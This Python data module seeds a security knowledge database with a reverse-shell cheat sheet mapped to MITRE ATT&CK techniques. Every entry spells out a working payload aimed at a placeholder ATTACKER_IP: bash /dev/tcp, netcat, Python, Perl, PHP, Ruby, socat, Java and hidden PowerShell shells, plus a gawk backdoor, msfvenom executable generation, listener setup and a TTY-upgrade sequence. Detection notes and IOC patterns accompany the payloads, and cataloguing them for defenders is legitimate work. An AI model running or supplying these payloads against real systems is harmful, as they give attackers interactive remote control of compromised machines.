"""
Structured knowledge data for reverse-shell techniques.

Source: https://github.com/HarshRatheeOfficial/Reverse-Shells-Cheat-Sheet
MITRE ATT&CK: https://attack.mitre.org/techniques/T1059/

This module defines the complete reverse-shell knowledge corpus as plain Python
dicts so it can be loaded into the Security Knowledge DB by seed_knowledge.py
without any external HTTP calls.  Every technique has:
  - canonical MITRE ATT&CK mapping (technique_id + sub-technique where applicable)
  - platform(s) it applies to
  - language / tool name
  - raw payload(s) — ATTACKER_IP / PORT are placeholders, never real IOCs
  - detection notes
  - references
"""

SOURCE = {
    "url": "https://github.com/HarshRatheeOfficial/Reverse-Shells-Cheat-Sheet",
    "title": "Reverse Shells Cheat Sheet",
    "kind": "research",
    "source_type": "github",
    "external_refs": {
        "github_owner": "HarshRatheeOfficial",
        "github_repo": "Reverse-Shells-Cheat-Sheet",
        "sha": "5ff8d99908ee5100d40997d3ffaf2b967ee918a3",
        "additional_refs": [
            "https://highon.coffee/blog/reverse-shell-cheat-sheet/",
            "http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet",
        ],
    },
}

# Parent attack-pattern entity — all techniques roll up here
PARENT_ATTACK_PATTERN = {
    "kind": "attack_pattern",
    "canonical_name": "T1059 - Command and Scripting Interpreter",
    "description": (
        "Adversaries may abuse command and script interpreters to execute commands, "
        "scripts, or binaries. These interfaces and languages provide ways of interacting "
        "with computer systems and are a common feature across many different platforms. "
        "Most systems come with some built-in command-line interface and scripting "
        "capabilities, for example, macOS and Linux distributions include some flavor of "
        "Unix Shell while Windows installations include the Windows Command Shell and "
        "PowerShell."
    ),
    "stix_id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
    "external_refs": {
        "mitre_attack": "T1059",
        "mitre_url": "https://attack.mitre.org/techniques/T1059/",
        "kill_chain_phase": "execution",
    },
    "properties": {
        "platforms": ["Linux", "macOS", "Windows"],
        "tactic": "Execution",
        "data_sources": ["Command: Command Execution", "Process: Process Creation"],
    },
}

# Grouped technique definitions.  Each entry becomes one Entity (attack_pattern)
# plus N Claims (one per payload variant).
TECHNIQUES: list[dict] = [
    # ── Linux: Bash ────────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059.004 - Unix Shell: Bash Reverse Shell",
            "description": (
                "A Bash reverse shell connects back to the attacker over TCP using /dev/tcp, "
                "a built-in Bash pseudo-device. No additional tools required on most Linux "
                "systems. Highly portable across modern Linux distributions."
            ),
            "external_refs": {
                "mitre_attack": "T1059.004",
                "mitre_url": "https://attack.mitre.org/techniques/T1059/004/",
                "parent_technique": "T1059",
            },
            "properties": {
                "platforms": ["Linux", "macOS"],
                "tool": "bash",
                "requires_network": True,
                "tactic": "Execution",
                "detection_notes": (
                    "Monitor for /dev/tcp usage in bash processes. "
                    "Alert on outbound TCP connections from shells. "
                    "EDR: bash spawning with stdout/stderr redirection to sockets."
                ),
            },
        },
        "claims": [
            {
                "statement": "Bash reverse shell via /dev/tcp pseudo-device (standard variant)",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "bash", "linux", "T1059.004", "no-deps"],
                "properties": {
                    "payload": "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
                    "platform": "Linux/macOS",
                    "requires": "bash >= 2.04",
                    "ioc_pattern": r"/dev/tcp/",
                    "sigma_condition": "bash and /dev/tcp/ and >&",
                },
            },
            {
                "statement": "Bash reverse shell using exec file descriptor 196",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "bash", "linux", "T1059.004", "fd-variant"],
                "properties": {
                    "payload": "0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196",
                    "platform": "Linux",
                    "variant_note": "Uses fd 196 to avoid some simple detection rules",
                    "ioc_pattern": r"exec.*<>/dev/tcp/",
                },
            },
            {
                "statement": "Bash reverse shell with exec 5 file descriptor and read loop",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "bash", "linux", "T1059.004", "fd-variant"],
                "properties": {
                    "payload": "exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done",
                    "platform": "Linux",
                    "variant_note": "Read loop evaluates each line as a command",
                },
            },
        ],
    },

    # ── Linux: Netcat ──────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1095 - Non-Application Layer Protocol: Netcat Reverse Shell",
            "description": (
                "Netcat (nc) can spawn interactive shells over raw TCP connections. "
                "The -e and -c flags execute a program after connect; the mkfifo variant "
                "works on netcat builds that lack -e (OpenBSD netcat). "
                "Widely pre-installed on Linux distributions."
            ),
            "external_refs": {
                "mitre_attack": "T1095",
                "mitre_url": "https://attack.mitre.org/techniques/T1095/",
                "parent_technique": "T1059",
                "tool_ref": "https://nmap.org/ncat/",
            },
            "properties": {
                "platforms": ["Linux", "macOS", "Windows"],
                "tool": "netcat",
                "aliases": ["nc", "ncat", "netcat"],
                "tactic": "Command and Control",
                "detection_notes": (
                    "Monitor for nc/ncat spawning /bin/sh or cmd.exe. "
                    "Alert on nc processes with -e flag. "
                    "Network: unexpected outbound TCP from nc process."
                ),
            },
        },
        "claims": [
            {
                "statement": "Netcat reverse shell using -e flag (traditional netcat)",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "netcat", "linux", "T1095", "no-deps"],
                "properties": {
                    "payload": "nc -e /bin/sh ATTACKER_IP PORT",
                    "platform": "Linux/macOS",
                    "requires": "netcat with -e support (traditional)",
                    "does_not_work_on": "OpenBSD netcat",
                },
            },
            {
                "statement": "Netcat reverse shell using -c flag (BSD variant)",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "netcat", "linux", "T1095"],
                "properties": {
                    "payload": "nc -c /bin/sh ATTACKER_IP PORT",
                    "platform": "Linux",
                },
            },
            {
                "statement": "Netcat reverse shell piping /bin/sh directly",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "netcat", "linux", "T1095"],
                "properties": {
                    "payload": "/bin/sh | nc ATTACKER_IP PORT",
                    "platform": "Linux",
                    "limitation": "Output only — no stdin to shell",
                },
            },
            {
                "statement": "Netcat reverse shell using mkfifo named pipe (OpenBSD-compatible)",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "netcat", "linux", "T1095", "fifo"],
                "properties": {
                    "payload": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f",
                    "platform": "Linux",
                    "requires": "mkfifo (coreutils)",
                    "note": "Works on OpenBSD netcat where -e/-c are absent",
                    "ioc_pattern": r"mkfifo.*nc.*LHOST",
                },
            },
        ],
    },

    # ── Linux: Python ──────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059.006 - Command and Scripting Interpreter: Python Reverse Shell",
            "description": (
                "Python one-liners create a TCP socket, connect to the attacker, "
                "and redirect stdin/stdout/stderr of a subprocess shell over it. "
                "Highly portable. Python 2 and Python 3 variants exist."
            ),
            "external_refs": {
                "mitre_attack": "T1059.006",
                "mitre_url": "https://attack.mitre.org/techniques/T1059/006/",
            },
            "properties": {
                "platforms": ["Linux", "macOS", "Windows"],
                "tool": "python",
                "tactic": "Execution",
                "detection_notes": (
                    "Monitor for python -c with socket imports. "
                    "Alert on os.dup2 used with socket filenos. "
                    "Process creation: python spawning /bin/sh."
                ),
            },
        },
        "claims": [
            {
                "statement": "Python 2 reverse shell via socket + subprocess",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "python", "python2", "linux", "T1059.006"],
                "properties": {
                    "payload": (
                        "python -c 'import socket,subprocess,os; "
                        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
                        "s.connect((\"ATTACKER_IP\",PORT)); "
                        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); "
                        "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                    ),
                    "platform": "Linux/macOS",
                    "requires": "python 2.x",
                },
            },
            {
                "statement": "Python 3 reverse shell via socket + subprocess",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "python", "python3", "linux", "T1059.006"],
                "properties": {
                    "payload": (
                        "python3 -c 'import socket,subprocess,os; "
                        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
                        "s.connect((\"ATTACKER_IP\",PORT)); "
                        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); "
                        "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                    ),
                    "platform": "Linux/macOS/Windows",
                    "requires": "python3",
                },
            },
        ],
    },

    # ── Linux: Perl ───────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059 - Command and Scripting Interpreter: Perl Reverse Shell",
            "description": (
                "Perl one-liners use the Socket module to establish a TCP connection "
                "and redirect shell I/O over it. Often pre-installed on Linux systems."
            ),
            "external_refs": {"mitre_attack": "T1059"},
            "properties": {
                "platforms": ["Linux", "macOS"],
                "tool": "perl",
                "tactic": "Execution",
                "detection_notes": "Monitor perl -e with Socket imports and exec('/bin/sh').",
            },
        },
        "claims": [
            {
                "statement": "Perl reverse shell via Socket module one-liner",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "perl", "linux", "T1059"],
                "properties": {
                    "payload": (
                        "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;"
                        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                        "exec(\"/bin/sh -i\");};'"
                    ),
                    "platform": "Linux/macOS",
                    "requires": "perl with Socket module",
                },
            },
        ],
    },

    # ── Linux: PHP ────────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059 - Command and Scripting Interpreter: PHP Reverse Shell",
            "description": (
                "PHP reverse shells exploit the CLI or web-context PHP interpreter "
                "to connect back to the attacker.  Web-deployed variants are often "
                "used after file-upload or code-injection vulnerabilities."
            ),
            "external_refs": {"mitre_attack": "T1059"},
            "properties": {
                "platforms": ["Linux", "macOS", "Windows"],
                "tool": "php",
                "tactic": "Execution",
                "detection_notes": (
                    "Monitor PHP processes spawning shell commands. "
                    "WAF: detect fsockopen + exec combination in POST bodies."
                ),
            },
        },
        "claims": [
            {
                "statement": "PHP reverse shell using fsockopen and exec",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "php", "linux", "T1059", "web"],
                "properties": {
                    "payload": "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                    "platform": "Linux/macOS",
                    "requires": "php CLI or web server with shell_exec enabled",
                    "ioc_pattern": r"fsockopen.*exec",
                },
            },
        ],
    },

    # ── Linux: Ruby ───────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059 - Command and Scripting Interpreter: Ruby Reverse Shell",
            "description": "Ruby one-liner using TCPSocket to establish a reverse shell connection.",
            "external_refs": {"mitre_attack": "T1059"},
            "properties": {
                "platforms": ["Linux", "macOS"],
                "tool": "ruby",
                "tactic": "Execution",
                "detection_notes": "Monitor ruby -rsocket -e with TCPSocket.open and exec.",
            },
        },
        "claims": [
            {
                "statement": "Ruby reverse shell via TCPSocket",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "ruby", "linux", "T1059"],
                "properties": {
                    "payload": (
                        "ruby -rsocket -e'"
                        "f=TCPSocket.open(\"ATTACKER_IP\",PORT).to_i;"
                        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
                    ),
                    "platform": "Linux/macOS",
                    "requires": "ruby with socket library",
                },
            },
        ],
    },

    # ── Linux: Socat ──────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1095 - Non-Application Layer Protocol: Socat Reverse Shell",
            "description": (
                "Socat (SOcket CAT) is a multipurpose relay tool. When available it provides "
                "a fully interactive PTY shell over TCP — more capable than netcat. "
                "Often a target for attacker tool-staging after initial access."
            ),
            "external_refs": {
                "mitre_attack": "T1095",
                "mitre_url": "https://attack.mitre.org/techniques/T1095/",
                "tool_ref": "http://www.dest-unreach.org/socat/",
            },
            "properties": {
                "platforms": ["Linux", "macOS"],
                "tool": "socat",
                "tactic": "Command and Control",
                "detection_notes": (
                    "Monitor socat process arguments for TCP: and EXEC:. "
                    "The PTY variant is especially dangerous — provides fully "
                    "interactive shell bypassing many detection heuristics."
                ),
            },
        },
        "claims": [
            {
                "statement": "Socat basic reverse shell (non-interactive)",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "socat", "linux", "T1095"],
                "properties": {
                    "payload": "socat TCP:ATTACKER_IP:PORT EXEC:/bin/sh",
                    "platform": "Linux/macOS",
                    "requires": "socat installed",
                },
            },
            {
                "statement": "Socat fully interactive PTY reverse shell",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "socat", "linux", "T1095", "pty", "interactive"],
                "properties": {
                    "payload": "socat file:`tty`,raw,echo=0 TCP:ATTACKER_IP:PORT",
                    "platform": "Linux/macOS",
                    "note": "Provides full PTY — interactive programs (vim, su) work",
                    "severity": "high",
                    "listener": "socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
                },
            },
        ],
    },

    # ── Linux: Java ───────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059 - Command and Scripting Interpreter: Java Reverse Shell",
            "description": (
                "Java runtime.exec() can be abused to establish reverse shells, particularly "
                "relevant in post-exploitation of application servers (Tomcat, WebLogic, Spring). "
                "Often triggered via JNDI injection or deserialization."
            ),
            "external_refs": {"mitre_attack": "T1059"},
            "properties": {
                "platforms": ["Linux", "macOS", "Windows"],
                "tool": "java",
                "tactic": "Execution",
                "detection_notes": (
                    "Java processes spawning bash/cmd.exe. "
                    "JNDI lookups in logs indicate potential Log4Shell-style vectors."
                ),
            },
        },
        "claims": [
            {
                "statement": "Java reverse shell using Runtime.exec() and /dev/tcp bash trick",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "java", "linux", "T1059", "runtime-exec"],
                "properties": {
                    "payload": (
                        "Runtime r = Runtime.getRuntime();\n"
                        "Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/PORT;"
                        "cat <&5 | while read line; do $line 2>&5 >&5; done'\");\n"
                        "p.waitFor();"
                    ),
                    "platform": "Linux",
                    "context": "Typically used in post-exploitation of Java EE servers",
                },
            },
        ],
    },

    # ── Linux: Gawk ───────────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059 - Command and Scripting Interpreter: Gawk Reverse Shell",
            "description": (
                "GNU Awk (gawk) supports TCP networking via /inet/ pseudo-devices. "
                "Can be used as a living-off-the-land technique since gawk is often "
                "present on minimal Linux installations."
            ),
            "external_refs": {"mitre_attack": "T1059"},
            "properties": {
                "platforms": ["Linux"],
                "tool": "gawk",
                "tactic": "Execution",
                "lotl": True,  # living off the land
                "detection_notes": "Gawk using /inet/tcp in scripts; unusual for production gawk usage.",
            },
        },
        "claims": [
            {
                "statement": "Gawk reverse shell via /inet/tcp pseudo-device (living-off-the-land)",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "gawk", "awk", "linux", "T1059", "lotl"],
                "properties": {
                    "payload": (
                        "#!/usr/bin/gawk -f\n\n"
                        "BEGIN {\n"
                        "    Port    =       8080\n"
                        "    Prompt  =       \"bkd> \"\n"
                        "    Service = \"/inet/tcp/\" Port \"/0/0\"\n"
                        "    while (1) {\n"
                        "        do {\n"
                        "            printf Prompt |& Service\n"
                        "            Service |& getline cmd\n"
                        "            if (cmd) {\n"
                        "                while ((cmd |& getline) > 0)\n"
                        "                    print $0 |& Service\n"
                        "                close(cmd)\n"
                        "            }\n"
                        "        } while (cmd != \"exit\")\n"
                        "        close(Service)\n"
                        "    }\n"
                        "}"
                    ),
                    "platform": "Linux",
                    "requires": "gawk >= 3.x",
                    "note": "Full backdoor — loops and accepts commands interactively",
                },
            },
        ],
    },

    # ── Windows: PowerShell ───────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1059.001 - Command and Scripting Interpreter: PowerShell Reverse Shell",
            "description": (
                "PowerShell TCPClient reverse shells are one of the most common Windows "
                "post-exploitation techniques. The payload uses -NoP -NonI -W Hidden -Exec Bypass "
                "to evade basic restrictions. Often delivered via spearphishing or macro documents."
            ),
            "external_refs": {
                "mitre_attack": "T1059.001",
                "mitre_url": "https://attack.mitre.org/techniques/T1059/001/",
            },
            "properties": {
                "platforms": ["Windows"],
                "tool": "powershell",
                "tactic": "Execution",
                "detection_notes": (
                    "PowerShell with -Exec Bypass and -EncodedCommand. "
                    "AMSI bypass attempts. "
                    "Outbound TCP from powershell.exe. "
                    "Script block logging (event 4104) captures the full payload."
                ),
            },
        },
        "claims": [
            {
                "statement": "PowerShell full reverse shell using TCPClient with IEX read loop",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "powershell", "windows", "T1059.001", "tcpclient"],
                "properties": {
                    "payload": (
                        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
                        '"$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',PORT);'
                        '$stream = $client.GetStream();'
                        '[byte[]]$bytes = 0..65535|%{0};'
                        'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'
                        ';$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                        '$sendback = (iex $data 2>&1 | Out-String);'
                        '$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';'
                        '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
                        '$stream.Write($sendbyte,0,$sendbyte.Length);'
                        '$stream.Flush()};$client.Close()"'
                    ),
                    "platform": "Windows",
                    "flags": "-NoP -NonI -W Hidden -Exec Bypass",
                    "ioc_pattern": "TCPClient.*GetStream.*iex",
                    "severity": "high",
                    "evasion_techniques": ["AMSI bypass", "execution policy bypass", "hidden window"],
                },
            },
        ],
    },

    # ── Windows: Netcat ───────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1095 - Non-Application Layer Protocol: Windows Netcat Reverse Shell",
            "description": (
                "Netcat for Windows (nc.exe) is commonly staged by attackers. "
                "When -e is available it spawns cmd.exe over the TCP connection."
            ),
            "external_refs": {"mitre_attack": "T1095"},
            "properties": {
                "platforms": ["Windows"],
                "tool": "netcat",
                "tactic": "Command and Control",
                "detection_notes": "nc.exe spawning cmd.exe. Tool staging of nc.exe itself is an IOC.",
            },
        },
        "claims": [
            {
                "statement": "Windows netcat reverse shell spawning cmd.exe",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "netcat", "windows", "T1095"],
                "properties": {
                    "payload": "nc -e cmd.exe ATTACKER_IP PORT",
                    "platform": "Windows",
                    "requires": "nc.exe with -e support (often staged)",
                },
            },
        ],
    },

    # ── Windows: MSFvenom ─────────────────────────────────────────────────
    {
        "entity": {
            "kind": "attack_pattern",
            "canonical_name": "T1587.001 - Develop Capabilities: Malware — MSFvenom Windows Payload",
            "description": (
                "MSFvenom generates compiled reverse-shell executables for Windows. "
                "The shell_reverse_tcp payload creates a standalone .exe that connects "
                "back to Metasploit's multi/handler. Commonly delivered as email attachments "
                "or dropped post initial access."
            ),
            "external_refs": {
                "mitre_attack": "T1587.001",
                "mitre_url": "https://attack.mitre.org/techniques/T1587/001/",
                "tool_ref": "https://www.metasploit.com/",
            },
            "properties": {
                "platforms": ["Windows", "Linux", "macOS"],
                "tool": "msfvenom",
                "tactic": "Resource Development",
                "detection_notes": (
                    "Static: common msfvenom shellcode patterns, MZ headers with unusual sections. "
                    "Dynamic: process calling back to C2 on non-standard ports."
                ),
            },
        },
        "claims": [
            {
                "statement": "MSFvenom Windows x64 shell_reverse_tcp payload generation",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "msfvenom", "metasploit", "windows", "T1587.001"],
                "properties": {
                    "payload": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe",
                    "platform": "Windows (target), Linux (attacker)",
                    "output_format": "PE executable (.exe)",
                    "detection": "Yara: metasploit shellcode signatures",
                },
            },
            {
                "statement": "MSFvenom Windows x64 Meterpreter reverse TCP payload",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "msfvenom", "meterpreter", "windows", "T1587.001"],
                "properties": {
                    "payload": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe",
                    "platform": "Windows",
                    "note": "Staged payload — requires active Metasploit handler",
                },
            },
            {
                "statement": "MSFvenom Linux x64 Meterpreter ELF payload",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "msfvenom", "meterpreter", "linux", "T1587.001"],
                "properties": {
                    "payload": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf",
                    "platform": "Linux",
                    "output_format": "ELF executable",
                },
            },
            {
                "statement": "MSFvenom PHP Meterpreter reverse TCP payload",
                "claim_type": "attack_technique",
                "tags": ["reverse-shell", "msfvenom", "meterpreter", "php", "web", "T1587.001"],
                "properties": {
                    "payload": "msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php",
                    "platform": "Linux/Windows (web server context)",
                    "requires": "PHP enabled on target",
                },
            },
        ],
    },

    # ── TTY Upgrade (Course of Action for defenders / awareness) ─────────
    {
        "entity": {
            "kind": "course_of_action",
            "canonical_name": "Post-Exploitation TTY Upgrade Technique",
            "description": (
                "After obtaining a non-interactive reverse shell, attackers commonly upgrade "
                "to a fully interactive TTY using Python's pty module, stty, and terminal reset. "
                "This enables use of interactive programs (sudo, ssh, vim), tab completion, "
                "and proper signal handling — making detection and eviction harder."
            ),
            "external_refs": {
                "mitre_attack": "T1059",
                "ref": "https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e",
            },
            "properties": {
                "platforms": ["Linux", "macOS"],
                "phase": "post-exploitation",
                "tactic": "Defense Evasion",
                "detection_notes": (
                    "Python pty.spawn in a non-login shell context. "
                    "stty raw invocation. "
                    "Terminal reset in a non-terminal session."
                ),
            },
        },
        "claims": [
            {
                "statement": "TTY upgrade sequence: Python pty + stty raw + terminal reset",
                "claim_type": "post_exploitation_technique",
                "tags": ["tty-upgrade", "post-exploitation", "linux", "T1059", "pty"],
                "properties": {
                    "payload_sequence": [
                        "# In reverse shell:",
                        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                        "Ctrl-Z",
                        "# In attacker console:",
                        "stty raw -echo",
                        "fg",
                        "# Back in reverse shell:",
                        "reset",
                        "export SHELL=bash",
                        "export TERM=xterm-256color",
                        "stty rows <rows> columns <cols>",
                    ],
                    "result": "Fully interactive PTY — supports sudo, ssh, vim, job control",
                    "note": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' for Python 3 targets",
                },
            },
        ],
    },

    # ── Listeners (Course of Action for defenders / awareness) ───────────
    {
        "entity": {
            "kind": "course_of_action",
            "canonical_name": "Reverse Shell Listener Setup Techniques",
            "description": (
                "Reverse shell listeners receive incoming connections from compromised hosts. "
                "Common listener tools: netcat, socat, Metasploit multi/handler. "
                "Documenting these helps defenders identify attacker infrastructure "
                "and understand what inbound connections look like from the attack side."
            ),
            "external_refs": {"mitre_attack": "T1095"},
            "properties": {
                "platforms": ["Linux", "macOS", "Windows"],
                "phase": "infrastructure-setup",
                "tactic": "Command and Control",
                "detection_notes": "Inbound connections on unusual ports; long-lived TCP sessions.",
            },
        },
        "claims": [
            {
                "statement": "Netcat listener for receiving reverse shells",
                "claim_type": "attacker_infrastructure",
                "tags": ["listener", "netcat", "c2-setup", "T1095"],
                "properties": {"payload": "nc -lvnp PORT", "platform": "Linux/macOS/Windows"},
            },
            {
                "statement": "Socat verbose listener for reverse shells",
                "claim_type": "attacker_infrastructure",
                "tags": ["listener", "socat", "c2-setup", "T1095"],
                "properties": {"payload": "socat -d -d TCP-LISTEN:PORT STDOUT", "platform": "Linux/macOS"},
            },
            {
                "statement": "Metasploit multi/handler listener setup",
                "claim_type": "attacker_infrastructure",
                "tags": ["listener", "metasploit", "meterpreter", "c2-setup", "T1095"],
                "properties": {
                    "payload_sequence": [
                        "msfconsole -q",
                        "use exploit/multi/handler",
                        "set payload linux/x64/meterpreter/reverse_tcp",
                        "set LHOST ATTACKER_IP",
                        "set LPORT PORT",
                        "exploit",
                    ],
                    "platform": "Linux/macOS/Windows (attacker side)",
                    "note": "Change payload to match the msfvenom payload used on target",
                },
            },
        ],
    },
]
